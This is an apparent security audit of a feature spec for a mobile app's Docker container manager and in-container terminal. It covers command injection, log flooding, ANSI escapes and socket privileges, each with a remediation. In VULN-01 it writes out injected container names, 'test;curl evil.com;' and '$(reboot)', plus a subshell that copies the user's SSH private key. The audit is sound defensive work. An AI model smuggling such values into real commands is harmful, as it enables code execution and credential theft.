# Security Audit Findings: Feature 45 (Docker Container Manager & In-Container Terminal Sessions)

- **Date**: 2026-10-20
- **Auditor**: `hacker`
- **Target Spec**: `docs/features/45-docker-container-manager-and-terminal.md`
- **Gate Status**: Pass with Remediations (CLEAR)

---

## 1. Attack Vectors & Threat Modeling

### VULN-01 [Severity: Medium] Shell Command Injection via Malicious Container Name
- **Description**: Attackers or untrusted scripts running on a shared host can name Docker containers with shell metacharacters (e.g. `test;curl evil.com;`, `$(reboot)`). If the mobile client concatenates raw container names into `docker exec` or `docker restart`, remote arbitrary code execution can occur under the developer's SSH user.
- **Attack Scenario**:
  A compromised container or developer repo starts a container with:
  `docker run --name 'app$(cat ~/.ssh/id_ed25519 > /tmp/pwned)' ...`
  When the user taps `[ >_ Terminal ]` on their phone, the shell command executes the embedded subshell.
- **Remediation**:
  1. The Rust Core validates all container IDs and names with strict regex: `^[a-zA-Z0-9][a-zA-Z0-9_.-]{1,127}$`. Any string failing this is rejected with `SshCoreError::InvalidContainerIdentifier`.
  2. For `docker exec`, the system strictly prefers the 12-character hex ID (`[0-9a-f]{12}`) rather than the arbitrary name.
- **Status**: Remediation incorporated into spec §5 and §6.

### VULN-02 [Severity: Low] DoS via Unbounded Log Output Streaming
- **Description**: Containers emitting high-frequency logs (e.g. tight panic loops, logging benchmarks) can swamp the SSH channel and exhaust iOS memory if `docker logs` is called without bounds.
- **Attack Scenario**:
  User taps `[ ⎘ Logs ]` on a container spewing gigabytes of text. The iOS app attempts to allocate a huge string buffer and crashes with OOM.
- **Remediation**:
  1. All log fetch commands are strictly bound with `--tail 200`.
  2. The Rust Core reader caps the output buffer at 1 MB, truncating excess with a clear indicator `\n... [Log truncated at 1 MB limit]`.
- **Status**: Remediation incorporated into spec §5.

### VULN-03 [Severity: Low] Malicious ANSI Escape Sequences in Container Names / Logs
- **Description**: Untrusted logs or container titles might output malicious terminal control sequences (OSC 52 clipboard hijacking, window title spoofing, or ANSI screen wipes).
- **Remediation**:
  1. Log previews are scrubbed of unprintable control characters and ANSI terminal codes via the core's `stripAnsiCodes` engine before being rendered in SwiftUI text views.
  2. The interactive terminal relies on SwiftTerm, which disables unprompted clipboard writing (OSC 52) without user action.
- **Status**: Remediation verified.

### VULN-04 [Severity: Info] Socket Hijacking and Privilege Escalation
- **Description**: Connecting to `/var/run/docker.sock` grants broad container creation privileges.
- **Remediation**:
  1. The feature only invokes read-only inspection (`docker ps`, `docker stats`, `docker logs`) and container lifecycle actions (`restart`, `exec`).
  2. The app never runs `docker exec` with `--privileged` or `--user root`.
  3. If the user's account on the host lacks access to the docker socket (permission denied), the app surfaces a graceful error card rather than failing or retrying in a loop.
- **Status**: Remediation incorporated into spec §5.

---

## 2. Review Gate (`rev`) Summary

- **Zero Battery Drain**: Confirmed. In-container terminal sessions run inside remote `tmux` sessions. Backgrounding the iOS app tears down the TCP socket immediately; the container process inside `tmux` continues uninterrupted on the host. Reopening from the Main Screen reconnects seamlessly.
- **Domain Models & Contracts**: Clean Rust structs with typed errors and serialization (`DockerContainerInfo`, `ContainerState`).
- **UI & No-Emoji Policy**: Confirmed. Strict use of SF Symbols (`shippingbox.fill`, `arrow.clockwise`, `doc.text`, `terminal`) and clean state dots (`●` green/red/orange).
- **Main Screen Integration**: Validated. The in-container session is registered as a first-class `TabSession` in `TerminalTabsManager` and rendered on `SessionsHomeView` alongside agent sessions.

---

## 3. Verdict

**VERDICT: CLEAR**

The specification meets all quality, architecture, and security criteria. Ready for implementation.
